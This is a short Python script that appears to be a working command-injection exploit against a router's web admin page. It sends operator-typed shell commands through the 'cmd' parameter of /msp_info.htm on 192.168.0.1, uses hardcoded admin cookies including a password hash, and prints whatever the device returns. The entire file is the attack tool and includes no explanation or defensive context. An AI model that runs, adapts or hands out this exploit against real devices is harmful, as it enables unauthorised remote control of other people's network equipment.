import http.client

def execute_command(command):
    target_host = "192.168.0.1"
    target_path = f"/msp_info.htm?flag=cmd&&cmd={command}"
    
    cookies = "wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=06EC0B7A13AD01069CA39D28C839C226"
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
        "Cookie": cookies
    }
    
    conn = http.client.HTTPConnection(target_host, 80)
    conn.request("GET", target_path, headers=headers)
    response = conn.getresponse()
    
    print(f"Executed command: {command}")
    print(f"Response status: {response.status}")
    print(f"Response text:\n{response.read().decode()}")
    
    conn.close()

if __name__ == "__main__":
    cmd = input("Enter command to execute: ")
    execute_command(cmd)

